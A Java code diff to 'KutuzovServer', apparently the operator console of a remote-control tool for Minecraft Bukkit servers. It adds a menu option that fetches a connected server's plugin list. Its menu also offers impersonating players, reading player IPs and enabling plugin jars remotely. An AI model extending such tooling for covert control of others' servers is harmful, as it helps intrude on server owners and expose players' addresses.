@@ -428,8 +428,9 @@ public class KutuzovServer {
         pnl("  2) Send command as player");
         pnl("  3) Send message as player");
         pnl("  4) Get player ip");
-        pnl("  5) Install plugin");
-        pnl("  6) Toggle plugin");
+        pnl("  5) Show plugin list");
+        pnl("  6) Enable plugin jar");
+        pnl("  7) Toggle plugin");
         pwl("Option: ");
         String input = readLine();
         int option = input.contentEquals("")?-1:Integer.parseInt(input);
@@ -520,7 +521,34 @@ public class KutuzovServer {
                 } catch (IOException exception) {
                     exception.printStackTrace();
                 }
-            }
+            } break;
+
+            case 5: {
+                clearConsole();
+                pnl("Obtaining plugin list...");
+
+                try {
+                    client.getOutput().writeObject(new SCBukkitPluginList());
+
+                    Packet packet = null;
+                    while(!(packet instanceof CSBukkitPluginList)) {
+                        try {
+                            packet = (Packet)client.getInput().readObject();
+                        } catch (Exception exception) {
+                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                            readLine();
+                            return;
+                        }
+                    }
+
+                    CSBukkitPluginList pluginList = (CSBukkitPluginList)packet;
+                    String pluginString = String.join(", ", pluginList.plugins);
+                    pnl("Plugins: " + pluginString);
+                    readLine();
+                } catch (IOException exception) {
+                    exception.printStackTrace();
+                }
+            } break;
 
             case 0:
                 user_list_client(client);
